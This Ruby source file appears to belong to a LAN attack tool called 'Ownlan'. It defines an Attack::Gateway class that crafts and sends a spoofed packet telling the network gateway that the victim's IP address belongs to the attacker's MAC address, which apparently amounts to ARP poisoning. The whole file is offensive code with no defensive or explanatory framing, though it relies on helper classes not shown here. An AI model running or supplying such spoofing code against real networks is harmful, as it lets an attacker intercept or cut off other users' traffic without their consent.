module Ownlan
  module Attack
    class Gateway < Base

      def process
        generate_packet

        send_packet
      end

      def generate_packet
        gw_ip  = ServiceObjects::NetworkInformation.gateway_ip

        saddr    = config.source_mac
        daddr    = config.gateway_mac || gateway_mac(gw_ip)

        saddr_ip = victim_ip
        daddr_ip = gw_ip

        @crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip).call
      end

      private

      def gateway_mac(gw_ip)
        ip_to_mac(gw_ip)
      end
    end
  end
end
